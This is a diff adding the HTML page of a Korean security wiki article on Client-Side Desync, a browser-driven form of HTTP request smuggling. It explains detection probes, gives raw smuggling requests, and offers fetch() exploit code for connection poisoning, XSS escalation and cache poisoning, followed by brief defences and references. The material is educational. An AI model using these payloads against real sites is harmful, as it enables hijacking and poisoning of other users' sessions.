@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Client-Side Desync Attack | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="CSD Attack">
+    
+
+    
+    <meta property="og:title" content="Client-Side Desync Attack">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/client-side-desync-attack/">
+  <meta property="og:description" content="CSD Attack">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Client-Side Desync Attack">
+  <meta name="twitter:description" content="CSD Attack">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/client-side-desync-attack/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Client-Side Desync Attack","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/client-side-desync-attack/","datePublished":"2022-12-23T00:00:00+00:00","dateModified":"2022-12-23T00:00:00+00:00","description":"CSD Attack","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/cullinan-attack-client-side-desync-attack.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Cullinan","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/"},{"@type":"ListItem","position":5,"name":"Client-Side Desync Attack"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Client-Side Desync Attack</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2022-12-23">
+                        DECEMBER 23, 2022
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">CSD Attack</p>
+            
+        </header>
+
+        <div class="post-body"><h2 id="introduction">Introduction</h2>
+<p>Client-Side Desync(CSD) Attack은 HTTP Request Smuggling(HRS, Desync Attack)의 한 종류로 기존의 HRS가 Browser가 전송할 수 없는 형태의 HTTP Request를 임의로 전송하여 서버 또는 광범위한 사용자를 대상으로 영향을 끼쳤다면 CSD는 Browser를 통해 전송할 수 있는 형태의 Smuggling으로 Self-smuggling(보통 HTTP Pipelining이라고 이야기하죠) 등의 케이스에서 영향력을 만들어낼 수 있는 기술입니다.</p>
+<p>이를 통해서 피해자의 웹 브라우저가 취약 웹 사이트를 방문할 때 발생하는 Connectrion을 비동기화 시키고 TCP/TLS 소켄에 공격자가 의도한 데이터(malicious prefix)를 남겨서 다음 Connection에서 트리거 시키는 형태로 동작합니다.</p>
+<p>실제 공격은 크게 아래 플로우로 이루어집니다.</p>
+<ol>
+<li>피해자가 공격코드가 삽입된 페이지 접근 (악성 사이트 또는 XSS가 삽입된 서비스 페이지)</li>
+<li>피해자의 브라우저는 취약 서버로 웹 요청을 전송함. 이 때 Body에는 Smuggling 요청이 포함됨</li>
+<li>서버가 Response를 주고 남은 공격자가 의도한 부분이 TCP/TLS 소켓에 남은 상태로 연결 종료</li>
+<li>다음 요청에서 공격자가 의도한 부분이 Prefix로 붙어 악의적인 웹 요청이 처리됨</li>
+</ol>
+<blockquote>
+<p>참고로 해당 기술은 기본적으로 HTTP Request Smuggling(HRS)에 대한 원리와 응용에 대한 이해가 필요합니다. HRS가 궁금하다면 <a href="/cullinan/http-request-smuggling/">Cullinan &gt; HTTP Request Smuggling (HRS)</a> 문서를 참고해주세요.</p>
+</blockquote>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<h4 id="probe">Probe</h4>
+<p>CSD를 찾기 위해선 가장 먼저 Content-Length 헤더를 무시하는 구간을 찾아야합니다. 이 떄 쉬운 방법으로는 CL:TE Smuggling과 비슷하게 헤더로 명시한 실제 Body 크기보다 더 큰 Content-Length를 헤더로 전송하여 서버가 기다리는지 확인하는 방법입니다. 보통 Content-Length가 Body보다 큰 경우 백엔드 서버는 추가로 데이터를 받기 위해 대기하게 되고 딜레이가 발생합니다.</p>
+<pre><code>POST /api/me HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 999
+
+aaaa
+</code></pre>
+<p>다만 때때로 어떤 서버들은 대기하지 않고 즉시 응답하는 경우가 있습니다. 이러한 경우 서버가 CL 헤더를 신뢰하지 않는 상태로 CSD가 발생할 가능성이 높습니다. 보통 아래 Endpoint 들에서 자주 발생합니다.</p>
+<ul>
+<li>POST를 기대하지 않는 API Endpoint</li>
+<li>Static Files</li>
+<li>Error Page</li>
+</ul>
+<h4 id="connection-check">Connection check</h4>
+<p>이제 Connection이 유지되는지 확인이 필요합니다. Smuggling의 기본적인 동작은 Connection 하나에 2개 이상의 HTTP Request를 포함하고, 이를 서버가 처리하는 과정에서 2개로 분리시키는 방법인데, 이는 CSD Attack에서도 동일하게 작용합니다.</p>
+<p>체크를 위한 좋은 방법 중 하나는 CL.0나 H2.0과 같이 정상적인 헤더만을 사용하는 Smuggling을 유도하는 방법입니다. CL.0나 H2.0로 하나의 Connection으로 전송한 요청이 나뉘어 처리된다면 Smugggling이 가능합니다.</p>
+<h4 id="cl0-smuggling">CL.0 Smuggling</h4>
+<p>CL.0는 기존 Smuggling과 동일하게 먼저 Smuggle 요청을 전송한 후 전송 요청을 추가 전송하여 서버의 반응을 살펴서 알 수 있습니다. Body에 404를 유도하는 데이터를 넣고 POST 요청을 전송합니다.</p>
+<pre><code>POST /api/me HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+
+HTTP/1.1 200 OK
+</code></pre>
+<p>이 때 기존 HRS라면 Content-Length나 Transfer-Encoding 등을 이용해 요청을 잘랐겠지만, CSD 케이스에선 정상 Content-Length로 전송합니다. 이후 후속요청을 전송했을 때 404가 유도되었다면 Smuggling 즉 CSD에 취약한 상태로 식별할 수 있습니다.</p>
+<pre><code>GET / HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 404 Not Found
+</code></pre>
+<p>보통은 POST를 지원하지 않는 페이지에서 위와 같이 호출하는 경우 발생할 확률이 높습니다.</p>
+<blockquote>
+<p><a href="/cullinan/http-request-smuggling/#cl0">Cullinan &gt; HTTP Request Smuggling(HRS) &gt; CL.0</a></p>
+</blockquote>
+<h4 id="h20-smuggling">H2.0 Smuggling</h4>
+<p>H2.0는 또한 정상적인 HTTP Request로 전송하여 Smuggling을 유도합니다.</p>
+<pre><code>POST /api/me HTTP/2
+Host: vulnerable-website.com
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+</code></pre>
+<h4 id="scanning">Scanning</h4>
+<p>보통의 경우 직접 CSD를 위해 찾는다기 보단 HRS를 찾는 과정에서 CL.0, H2.0 이슈를 발견하면 같이 테스트해보는 형태로 작업을 진행하는 것이 수월합니다. 그래서 Smuggling 식별을 위한 스캐닝 작업에서 힌트를 얻는 경우가 많습니다.</p>
+<p>다만 아쉽게도 기존에 잘 알려진 CLI 기반 도구들은 CL.0, H2.0를 모두 지원하지 못하는 경우가 많습니다. BurpSuite의 <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">HTTP Request Smuggler</a>가 스캔 성능으로는 가장 좋다고 판단됩니다.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>만약 CSD Attack의 포인트를 찾았다면 이제 브라우저에서 CSD 코드가 동작할 수 있도록 작성합니다. 기존 HRS가 비정상 헤더를 이용한 방법이였다면 CSD는 기본적으로 브라우저에서 동작하는 것을 전제하기 때문에 fetch하는 코드로 동작 시켜야합니다.</p>
+<pre><code class="language-javascript hljs">fetch<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://vulnerable-website.com/api/me&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span>
+    method<span class="hljs-operator">:</span> <span class="hljs-string">&#39;POST&#39;</span><span class="hljs-punctuation">,</span>
+    body<span class="hljs-operator">:</span> <span class="hljs-string">&quot;GET /hopefully404 HTTP/1.1\r\nFoo: x&quot;</span><span class="hljs-punctuation">,</span> 
+    mode<span class="hljs-operator">:</span> <span class="hljs-string">&#39;no-cors&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ensure connection ID is visible
+</span><span class="hljs-comment"></span>    credentials<span class="hljs-operator">:</span> <span class="hljs-string">&#39;include&#39;</span> <span class="hljs-comment">// poison &#39;with-cookies&#39; pool
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>then<span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">=&gt;</span> <span class="hljs-punctuation">{</span>
+    location <span class="hljs-operator">=</span> <span class="hljs-string">&#39;https://vulnerable-website.com/&#39;</span> <span class="hljs-comment">// use the poisoned connection
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>이 때 mode를 <code>no-cors</code>로 주는데, 이는 크롬에서 단일 connection ID로 표시하기 위한 트릭으로 디버깅을 쉽게 해줄 수 있습니다. 굳이 필요하지 않은 부분이니 제외하셔도 됩니다.</p>
+<h4 id="xss">XSS</h4>
+<p>하나의 Request로 2개의 Response를 받을 수 있기 떄문에 Content-Type이 text/html인 페이지를 호출하고, 두번째 요청에서 JSON XSS(XSS Weakness 참고) 같이 영향없는 Reflected의 Type을 바꿔주는 형태로 리스크업이 가능합니다.</p>
+<pre><code class="language-javascript hljs">fetch<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://vulnerable-website.com/api/me&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span>
+    method<span class="hljs-operator">:</span> <span class="hljs-string">&#39;POST&#39;</span><span class="hljs-punctuation">,</span>
+    body<span class="hljs-operator">:</span> <span class="hljs-string">`</span><span class="hljs-string">HEAD /404/?cb=123 HTTP/1.1</span><span class="hljs-string">\r</span><span class="hljs-string">\n</span><span class="hljs-string">\r</span><span class="hljs-string">\n</span><span class="hljs-string">GET /x?x=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</span><span class="hljs-string">\r</span><span class="hljs-string">\n</span><span class="hljs-string">X: Y</span><span class="hljs-string">`</span><span class="hljs-punctuation">,</span>
+    credentials<span class="hljs-operator">:</span> <span class="hljs-string">&#39;include&#39;</span><span class="hljs-punctuation">,</span>
+    mode<span class="hljs-operator">:</span> <span class="hljs-string">&#39;cors&#39;</span>
+<span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-keyword">catch</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">=&gt;</span> <span class="hljs-punctuation">{</span>
+    location <span class="hljs-operator">=</span> <span class="hljs-string">&#39;https://vulnerable-website.com/&#39;</span>
+<span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<pre><code>POST /api/me HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 72
+
+HEAD /404/?cb=123 HTTP/1.1
+
+GET /x?&lt;script&gt;evil() HTTP/1.1
+X: YGET / HTTP/1.1
+Host: vulnerable-website.com
+</code></pre>
+<h4 id="cache-poisoning">Cache Poisoning</h4>
+<p>CSD를 이용하면 공격자 본인에게만 영향을 미치는 Cache Poisoning을 타인을 공격할 수 있는 Cache Poisoning으로 바꿀 수 있습니다. 말 그대로 브라우저에서 캐싱하기 떄문에 포인트만 된다면 쉽게 악의적인 Response를 캐시시키고, 공격에 사용할 수 있습니다.</p>
+<pre><code class="language-javascript hljs">fetch<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://redacted/&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span>method<span class="hljs-operator">:</span> <span class="hljs-string">&#39;POST&#39;</span><span class="hljs-punctuation">,</span> body<span class="hljs-operator">:</span> <span class="hljs-string">&quot;GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y&quot;</span><span class="hljs-punctuation">,</span> credentials<span class="hljs-operator">:</span> <span class="hljs-string">&#39;include&#39;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-keyword">catch</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">=&gt;</span> <span class="hljs-punctuation">{</span> location<span class="hljs-operator">=</span><span class="hljs-string">&#39;https://redacted/+CSCOE+/win.js&#39;</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h4 id="etc">Etc</h4>
+<p>Smuggling과 마찬가지고 서비스의 구성, 동작에 따라서 악용할 방법은 굉장히 많습니다.</p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>CSD Attack은 HTTP Request Smugglin과 다르게 정상 헤더로 전송됩니다. 그래서 기존에 WAS나 네트워크 장비단에서 차단할 수 없는 경우가 많고, 서비스단 로직에서 직접 대응이 필요할 수 있습니다.</p>
+<p>요청을 처리할 때 서버단에서의 예외(e.g GET만 사용하는 API에 Body가 전달되었다 등)가 발생하면 Connection을 Close 해주는게 좋습니다.</p>
+<blockquote>
+<p>사실 대응방안이 좋은 API 작성과는 완전 반대의 내용이라 실제 케이스에서 대응하기는 굉장히 까다롭습니다. 단순히 코드단에서만 대응하는게 아니라 앞단의 서버 등에서도 충분히 대응할 방법은 고안할 수 있으니 서비스 환경에 맞게 고민하고 대응하는 것이 가장 좋은 방법이라고 생각합니다.</p>
+</blockquote>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/request-smuggling/browser/client-side-desync">https://portswigger.net/web-security/request-smuggling/browser/client-side-desync</a></li>
+<li><a href="https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf">https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf</a></li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+        <nav class="post-navigation" aria-label="Post navigation">
+            
+                
+                
+                
+                
+            <a href="/cullinan/attack/subdomain-takeover/" class="nav-prev" rel="prev">
+                <span class="nav-label">← Previous</span>
+                <span class="nav-title">Subdomain Takeover</span>
+            </a>
+            
+
+            
+                
+                
+                
+                
+            <a href="/cullinan/attack/zip-bomb/" class="nav-next" rel="next">
+                <span class="nav-label">Next →</span>
+                <span class="nav-title">Zip Bomb</span>
+            </a>
+            
+        </nav>
+                    
+                
+                    
+                
+                    
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
